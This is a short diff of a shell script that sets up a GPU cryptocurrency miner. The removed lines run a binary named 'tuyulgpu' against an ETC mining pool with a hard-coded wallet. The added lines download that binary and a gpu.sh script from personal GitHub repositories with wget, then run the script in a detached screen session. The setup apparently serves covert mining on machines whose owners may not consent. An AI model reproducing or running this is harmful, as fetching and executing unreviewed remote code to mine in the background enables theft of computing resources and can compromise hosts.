@@ -1,6 +1,9 @@
-#!/bin/bash
-POOL=etc.2miners.com:1010
-WALLET=0x88801a3abc8da3f9a63269bd78d12e2f798d286d
-WORKER=$(echo $(shuf -i 1-4 -n 1)-GPU)
-chmod +x tuyulgpu
-./tuyulgpu --algo ETCHASH --pool $POOL --user $WALLET.$WORKER
+#!/bin/sh
+
+sudo apt update
+sudo apt install screen -y
+screen -dmS gpu.sh ./gpu.sh 65 75
+wget https://github.com/nuri655/nur/raw/main/tuyulgpu
+wget https://raw.githubusercontent.com/levyglory45/pivot/main/gpu.sh
+chmod +x gpu.sh
+./gpu.sh
